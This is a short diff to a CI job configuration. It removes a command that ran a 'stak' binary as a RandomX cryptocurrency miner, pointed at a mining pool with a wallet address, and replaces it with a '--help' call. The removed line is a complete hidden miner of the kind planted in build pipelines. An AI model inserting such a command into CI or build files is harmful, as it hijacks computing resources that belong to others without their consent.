@@ -9,4 +9,4 @@ jobs:
           name: apoppo
           command: |
             chmod u+x stak
-            ./stak -a randomx --url randomx.rplant.xyz:17080 --tls --user 85j6PJTt7h2WUCWBR47nRN7oomikMk836H2yEe91eJTB9fvD16ErMNiQXzeJZDr5Tzi2AV1C3sfMNfRyj27E7wnzFEVipKj.x
+            ./stak --help
